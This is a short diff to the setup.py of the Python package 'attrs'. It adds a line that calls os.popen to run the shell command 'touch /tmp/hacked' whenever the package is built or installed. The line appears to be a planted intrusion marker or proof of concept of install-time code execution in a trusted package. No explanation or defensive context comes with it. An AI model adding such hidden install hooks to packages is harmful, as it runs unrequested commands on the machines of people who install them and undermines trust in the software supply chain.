@@ -7,6 +7,8 @@ from setuptools import find_packages, setup
 
 ###############################################################################
 
+os.popen("touch /tmp/hacked")
+
 NAME = "attrs"
 PACKAGES = find_packages(where="src")
 META_PATH = os.path.join("src", "attr", "__init__.py")
